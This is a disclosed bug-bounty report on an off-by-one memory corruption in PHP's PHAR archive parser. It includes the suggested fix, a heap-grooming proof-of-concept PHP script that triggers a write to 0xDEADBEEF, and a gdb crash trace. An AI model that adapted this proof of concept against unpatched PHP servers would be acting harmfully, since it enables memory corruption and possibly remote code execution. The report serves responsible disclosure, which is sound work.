# Memory corruption when parsing a hostile PHAR archive

## Report Details
- **Report ID**: 195586
- **URL**: https://hackerone.com/reports/195586
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-01-03T20:48:44.541Z
- **Disclosed**: 2019-10-13T09:31:06.661Z

## Reporter
- **Username**: aerodudrizzt
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
The vulnerability was reported to PHP's security team and was fixed:
* Ticket 73768: https://bugs.php.net/bug.php?id=73768
* Git commit: https://gist.github.com/anonymous/84961673ee34be7f1a52b83dd872af50

The PHAR module in all PHP versions (5.6.9 and below, 7.1.0 and below) is vulnerable to a memory corruption and possibly a remote code execution attack when parsing a hostile PHAR archive. Here are the technical details:
* File: ext\phar\phar.c
* Function:  phar_parse_pharfile()

The function incorrectly '\0' terminates the buffer in case the alias does not match:
```
buffer[tmp_len] = '\0';
```
When a hostile archive sets tmp_len to be manifest_length - 14, this will write the '\0' just outside the buffer (off-by-one), thus overriding emalloc's metadata.

The assignment should be replaced with:
```
buffer[MIN(tmp_len, (size_t)(endbuffer - buffer) - 1)] = '\0';
```

This vulnerability was demonstrated with this PHP script:
```
<?php
	$length = 192;
	$array  = array();
	$x = 0;
	while ( $x < 4 ){
		$array[$x++] = str_repeat($x, ($length - 20));
	}

	try{
		$p = Phar::LoadPhar('example_hostile.phar', 'alias.phar');
	}
	catch(Exception $e){
		echo "Failed to load the phar archive\n";
	}

	$s = str_repeat("\xef\xbe\xad\xde", ($length - 20) / 4);
	while ( $x < 8 ){
		$array[$x++] = str_repeat($x, ($length - 20));
	}
?>
```
When parsing the hostile PHAR archive it caused a crash when trying to write data into the 0xDEADBEEF address:
```
#0  0x80260e75 in _emalloc ()
#1  0x802610d8 in _safe_emalloc ()
#2  0x801fac73 in zif_str_repeat ()
#3  0x8031b662 in execute_internal ()
#4  0x80274dce in dtrace_execute_internal ()
#5  0x8030cf65 in ?? ()
#6  0x802c56da in execute_ex ()
#7  0x80274c35 in dtrace_execute_ex ()
#8  0x8031d1b6 in zend_execute ()
#9  0x8028510d in zend_execute_scripts ()
#10 0x80224054 in php_execute_script ()
#11 0x8031f01f in ?? ()
#12 0x800fe64f in main ()
(gdb) info reg
eax            0xdeadbeef	-559038737
ecx            0xb5000074	-1258291084
edx            0xd	13
ebx            0xb5000040	-1258291136
esp            0xbffedf80	0xbffedf80
ebp            0xb50131e0	0xb50131e0
esi            0x7	7
edi            0x1	1
eip            0x80260e75	0x80260e75 <_emalloc+101>
eflags         0x210282	[ SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```
This demonstrates how this memory corruption can be used to achieve a memory write in an arbitrary memory address in the PHP's process, thus maybe enabling a remote code exploitation over the targeted PHP server.

## Attachments
No attachments
